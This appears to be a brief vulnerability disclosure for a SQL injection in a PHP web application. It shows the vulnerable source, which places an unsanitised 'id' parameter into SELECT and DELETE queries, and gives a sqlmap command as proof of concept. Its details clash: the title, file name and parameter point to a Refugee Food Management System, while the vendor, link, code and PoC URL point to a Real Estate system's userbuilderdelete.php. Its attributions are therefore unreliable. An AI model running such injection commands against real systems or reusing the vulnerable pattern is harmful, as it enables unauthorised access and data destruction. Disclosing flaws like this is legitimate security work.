# SQLi in code-projects Refugee Food Management System 1.0 of file /home/viewtakenfd.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /home/viewtakenfd.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/viewtakenfd.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

**injection point: id**

```php
<?php
include("config.php");
$uid = $_GET['id'];

// view code//
$sql = "SELECT * FROM user where uid='$uid'";
$result = mysqli_query($con, $sql);
while($row = mysqli_fetch_array($result))
	{
	  $img=$row["uimage"];
	}
@unlink('user/'.$img);

//end view code
$msg="";
$sql = "DELETE FROM user WHERE uid = {$uid}";
$result = mysqli_query($con, $sql);
if($result == true)
{
	$msg="<p class='alert alert-success'>Builder Deleted</p>";
	header("Location:userbuilder.php?msg=$msg");
}
else
{
	$msg="<p class='alert alert-warning'>Builder not Deleted</p>";
		header("Location:userbuilder.php?msg=$msg");
}

mysqli_close($con);
?>

```

### POC

```bash
sqlmap -u "http://192.168.93.1/RealEstate/admin/userbuilderdelete.php?id=1" --cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --level=2
```



![image-20251212095045212](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241621628.png)

